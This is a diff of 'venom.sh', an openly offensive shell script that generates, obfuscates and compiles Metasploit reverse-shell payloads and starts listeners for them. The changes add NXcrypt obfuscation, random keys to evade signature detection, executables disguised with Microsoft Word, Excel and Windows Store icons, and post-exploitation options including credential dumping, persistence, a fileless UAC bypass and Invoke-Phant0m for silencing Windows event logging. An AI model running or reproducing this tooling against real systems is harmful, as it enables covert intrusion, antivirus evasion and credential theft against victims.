@@ -1,9 +1,9 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.13
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.14
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017
-# codename: release the kraken [ GPL licensed ]
+# codename: Pandora's box (pithos) [ GPL licensed ]
 # --------------------------------------------------------------
 # [DEPENDENCIES]
 # "venom.sh will download/install all dependencies as they are needed"
@@ -21,15 +21,16 @@ resize -s 40 90 > /dev/null
 
 
 
+
 # ---------------------
 # check if user is root
 # ---------------------
 if [ $(id -u) != "0" ]; then
-echo "[☠] we need to be root to run this script..."
-echo "[☠] execute [ sudo ./venom.sh ] on terminal"
-exit
+  echo "[x] we need to be root to run this script..."
+  echo "[x] execute [ sudo ./venom.sh ] on terminal"
+  exit
 else
-echo "root user" > /dev/null 2>&1
+  :
 fi
 
 
@@ -41,13 +42,12 @@ fi
 # ----------------------
 OS=`uname` # grab OS
 H0m3=`echo ~` # grab home path
-ver="1.0.13" # script version display
-C0d3="release the kraken" # version codename display
+ver="1.0.14" # script version display
+C0d3="Pandora's box (pithos)" # version codename display
 user=`who | awk {'print $1'}` # grab username
 # user=`who | cut -d' ' -f1 | sort | uniq` # grab username
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd` # grab venom.sh install path (home/username/shell)
-mSf=`locate modules/post/windows/escalate | egrep -m 1 "post"` # grab msf post folder path
 # ------------------------------------------------------------------------
 # funtions [templates] to be injected with shellcode
 # ------------------------------------------------------------------------
@@ -73,20 +73,6 @@ InJEc16="$IPATH/templates/exec.jar" # jar script path
 
 
 
-#
-# Config user system correct arch (wine)
-#
-ArCh=`uname -m`
-if [ "$ArCh" = "i686" ]; then
-  arch="wine"
-  ComP="i586-mingw32msvc-gcc"
-else
-  arch="wine64"
-  ComP="i686-w64-mingw32-gcc"
-fi
-
-
-
 # -------------------------------------------
 # SETTINGS FILE FUNTION (venom-main/settings)
 # -------------------------------------------
@@ -96,10 +82,26 @@ ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null
 D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
 DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
 MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
+PyIn=`cat settings | egrep -m 1 "PYTHON_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
+PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
+mSf=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
+UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)
 
 
 
 
+#
+# Config user system correct arch (wine)
+#
+if [ "$ArCh" = "x86" ]; then
+  arch="wine"
+  ComP="i586-mingw32msvc-gcc"
+else
+  arch="wine64"
+  ComP="i686-w64-mingw32-gcc"
+fi
 
 
 
@@ -197,7 +199,7 @@ cat << !
                \  \// |   ___||     \| ||     ||     \/   |
                 \__/  |______||__/\____|\_____/|__/\__/|__|
                   |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
-                      - CodeName: $C0d3 -
+                    - CodeName: $C0d3 -
 !
 echo "    ╔────────────────────────────────────────────────────────────────╗"
 echo "    |  The author does not hold any responsibility for the bad use   |"
@@ -210,15 +212,14 @@ echo "    |  build, embedded into one template (any language), obfuscated  |"
 echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
 echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
 echo "    ╠────────────────────────────────────────────────────────────────╝"
-echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(RedTeam)"
+echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(red_team)"
 echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
 echo "" && echo ""
-sleep 2
-echo "[☠] Press [ENTER] to continue ..."
+sleep 1
+echo "[✔] Toolkit settings:$ArCh arch's"
+echo "[☠] Press [ENTER] to continue .."
 read op
 clear
-
-
 
 
 
@@ -313,6 +314,11 @@ rm $ApAcHe/*.deb > /dev/null 2>&1
 rm $IPATH/*.spec > /dev/null 2>&1
 rm -r $IPATH/dist > /dev/null 2>&1
 rm -r $IPATH/build > /dev/null 2>&1
+# delete rtf files
+rm /tmp/shell.exe > /dev/null 2>&1
+rm $ApAcHe/shell.exe > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
 # exit venom.sh
 echo "[☠] Exit Shellcode Generator..."
 echo "[_Codename:$C0d3]"
@@ -469,6 +475,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log  
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -481,6 +488,29 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 250) > /dev/null 2>&1
+
+
+
+if [ "$P0" = "post_linux.rc" ]; then
+# store metasploit post exploit directory structure
+CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
+  echo "[✔] wifi_dump_linux.rb -> found"
+  sleep 2
+else
+  echo "[x] wifi_dump_linux.rb -> not found"
+  sleep 1
+  echo "    copy post-module to msfdb .."
+  cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
+  echo "[☠] Reloading msfdb database .."
+  sleep 2
+  xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+  xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+
+fi
+fi
+
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -516,6 +546,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -544,6 +575,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -702,6 +734,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -716,7 +749,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
       # user settings
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 320) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -737,6 +770,41 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     echo "exploit" >> $lhost.rc
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -777,6 +845,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -805,6 +874,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -833,6 +903,7 @@ rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -872,7 +943,7 @@ cat << !
 
 # use metasploit to build shellcode
 # new obfuscating method
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll > $IPATH/output/$N4m.dll"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/countdown -i 7 -f raw | msfvenom --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom --platform windows -e x86/shikata_ga_nai -i 7 -f dll > $IPATH/output/$N4m.dll"
 echo ""
 echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
@@ -912,6 +983,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -925,7 +997,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 320) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 350) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -946,6 +1018,42 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     echo "exploit" >> $lhost.rc
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -987,6 +1095,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1014,6 +1123,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -1034,6 +1144,7 @@ rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m > /dev/null 2>&1
 rm $ApAcHe/$N4m2 > /dev/null 2>&1
 rm $ApAcHe/trigger.bat > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 clear
 }
 
@@ -1046,6 +1157,7 @@ clear
 # 1º option: build default shellcode (my-way)
 # 2º veil-evasion python -> pyherion (reproduction)
 # 3º use pyinstaller by:david cortesi to compile python-to-exe
+# 4º use NXcrypt to insert junk into sourcecode (obfuscation)
 # -------------------------------------------------------------
 sh_shellcode4 () {
 # get user input to build shellcode (python)
@@ -1121,8 +1233,7 @@ chmod +x $IPATH/output/$N4m.py
 # -----------------------------------------
 # chose what to do with generated shellcode
 # -----------------------------------------
-cUe=`echo $N4m.py | cut -d '.' -f1`
-ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m.py) python" FALSE "pyherion ($N4m.py) obfuscated" FALSE "pyinstaller ($cUe.exe) executable" --width 320 --height 210) > /dev/null 2>&1
+ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m.py) python" FALSE "pyherion ($N4m.py) obfuscated" FALSE "NXcrypt ($N4m.py) obfuscated" FALSE "pyinstaller ($N4m.exe) executable" --width 340 --height 240) > /dev/null 2>&1
 
 
    if [ "$ans" "=" "default ($N4m.py) python" ]; then
@@ -1142,6 +1253,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -1184,6 +1296,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -1199,26 +1312,76 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      sleep 2
      clear
 
-      
+
+   elif [ "$ans" "=" "NXcrypt ($N4m.py) obfuscated" ]; then
+     echo "[☠] NXcrypt -> found .."
+     sleep 2
+     echo "[☠] obfuscating -> $N4m.py!"
+     sleep 2
+     # use NXcrypt to obfuscate sourcecode
+     cd $IPATH/obfuscate/
+     xterm -T " NXcrypt obfuscator " -geometry 130x26 -e "sudo ./NXcrypt.py --file=$IPATH/output/$N4m.py --output=$IPATH/output/output_file.py"
+     rm $IPATH/output/$N4m.py > /dev/null 2>&1
+     mv $IPATH/output/output_file.py $IPATH/output/$N4m.py
+     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
+     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         sed -i "s/\[1m\[31m//g" final.log
+         sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         cd $IPATH/
+       fi
+
+     # CLEANING EVERYTHING UP
+     echo "[☠] Cleanning temp generated files..."
+     mv $IPATH/templates/exec[bak].py $InJEc2
+     rm $IPATH/output/chars.raw > /dev/null 2>&1
+     cd $IPATH/
+     sleep 2
+     clear
+
 
    else
 
 
      # check if pyinstaller its installed
-     if [ -d $DrIvC/pyinstaller-2.0 ]; then
+     if [ -d $DrIvC/$PiWiN ]; then
        # compile python to exe
        echo "[☠] pyinstaller -> found!"
        sleep 2
-       echo "[☠] compile $N4m.py -> $cUe.exe"
+       echo "[☠] compile $N4m.py -> $N4m.exe"
        sleep 2
        cd $IPATH/output
-       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/Python26/Python.exe c:/pyinstaller-2.0/pyinstaller.py --noconsole --onefile $IPATH/output/$N4m.py'"
-       cp $IPATH/output/dist/$cUe.exe $IPATH/output/$cUe.exe
+
+# chose executable final icon (.ico)
+iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1
+
+       #
+       # TODO: check if executes on windows systems
+       #
+       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/$N4m.py'"
+       cp $IPATH/output/dist/$N4m.exe $IPATH/output/$N4m.exe
        rm $IPATH/output/*.spec > /dev/null 2>&1
        rm $IPATH/output/*.log > /dev/null 2>&1
        rm -r $IPATH/output/dist > /dev/null 2>&1
        rm -r $IPATH/output/build > /dev/null 2>&1
-       zenity --title=" PYINSTALLER " --text "PAYLOAD STORED UNDER:\n$IPATH/output/$cUe.exe" --info > /dev/null 2>&1
+       zenity --title=" PYINSTALLER " --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.exe" --info > /dev/null 2>&1
        echo ""
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
@@ -1235,6 +1398,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
+           sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -1257,7 +1421,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
        echo "[☠] pyinstaller -> not found!"
        sleep 2
        echo "[☠] Please run: cd aux && sudo ./setup.sh"
-       echo "[☠] to install all missing dependencies..."
+       echo "[☠] to install all missing dependencies .."
        exit
      fi
    fi
@@ -1299,7 +1463,7 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f c > $IPATH/output/chars.raw"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"
 
 
 echo ""
@@ -1364,8 +1528,8 @@ cd $IPATH/templates
 # COMPILING SHELLCODE USING mingw32
 echo "[☠] Compiling using mingw32..."
 sleep 2
-# special thanks to astr0baby for mingw32 -mwindows flag :D
-$ComP exec_bin.c -o $N4m.exe -mwindows
+# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
+$ComP exec_bin.c -o $N4m.exe -lws2_32 -mwindows
 mv $N4m.exe $IPATH/output/$N4m.exe
 
 
@@ -1389,6 +1553,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
+           sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
@@ -1401,7 +1566,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1433,10 +1598,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
